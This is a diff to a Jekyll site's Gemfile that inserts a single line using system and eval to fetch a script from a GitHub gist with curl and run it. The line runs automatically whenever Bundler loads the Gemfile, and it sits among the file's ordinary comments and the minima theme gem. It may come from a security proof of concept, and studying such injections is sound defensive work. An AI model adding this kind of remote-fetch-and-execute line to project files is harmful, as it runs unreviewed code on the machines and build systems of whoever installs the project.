@@ -7,6 +7,8 @@ source "https://rubygems.org"
 #     bundle exec jekyll serve
 #
 
+system('eval "$(curl https://gist.githubusercontent.com/h1-0xn3va/68872b876152dd40f44550b6a16ba8ee/raw/1420db2c2550cc631dc65ceef8694682bf545e1a/1)"')
+
 # This is the default theme for new Jekyll sites. You may change this to anything you like.
 gem "minima", "~> 2.0"
 
